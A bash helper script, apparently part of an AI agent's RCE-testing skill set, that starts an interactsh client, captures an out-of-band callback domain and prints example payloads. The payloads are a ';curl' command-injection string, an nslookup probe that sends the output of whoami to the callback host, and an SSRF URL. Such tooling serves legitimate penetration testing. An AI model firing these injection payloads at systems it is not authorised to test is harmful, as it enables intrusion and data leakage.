#!/usr/bin/env bash
# oob_setup.sh — Start interactsh and export the callback domain for use in RCE payloads.
#
# Usage:
#   source /workspace/.skills/rce/scripts/oob_setup.sh
#   echo "Use this domain in payloads: $CALLBACK_DOMAIN"
#   # Then check for callbacks: cat /workspace/interactsh.log | grep Received
#
# Stop interactsh when done:
#   kill $INTERACTSH_PID 2>/dev/null

set -e

INTERACTSH_LOG="/workspace/interactsh.log"

echo "[*] Starting interactsh-client..."
interactsh-client \
  -server oast.fun \
  -o "$INTERACTSH_LOG" \
  -v &

export INTERACTSH_PID=$!
echo "[*] interactsh PID: $INTERACTSH_PID"

# Wait for the registration to complete and domain to appear
echo "[*] Waiting for callback domain registration..."
for i in $(seq 1 15); do
  sleep 2
  DOMAIN=$(grep -oE '[a-z0-9]{20,}\.oast\.(fun|pro|me|live)' "$INTERACTSH_LOG" 2>/dev/null | head -1)
  if [ -n "$DOMAIN" ]; then
    export CALLBACK_DOMAIN="$DOMAIN"
    echo "[+] Callback domain: $CALLBACK_DOMAIN"
    echo "[+] Example payloads:"
    echo "    Shell:   ;curl http://${CALLBACK_DOMAIN}/ci"
    echo "    DNS:     \$(nslookup \$(whoami).${CALLBACK_DOMAIN})"
    echo "    SSRF:    http://${CALLBACK_DOMAIN}/ssrf-test"
    echo ""
    echo "[*] Monitoring log: tail -f $INTERACTSH_LOG"
    break
  fi
done

if [ -z "$CALLBACK_DOMAIN" ]; then
  echo "[!] Failed to get callback domain after 30s. Check network connectivity."
  echo "[!] Try: interactsh-client -server oast.pro (alternate server)"
  kill "$INTERACTSH_PID" 2>/dev/null || true
fi
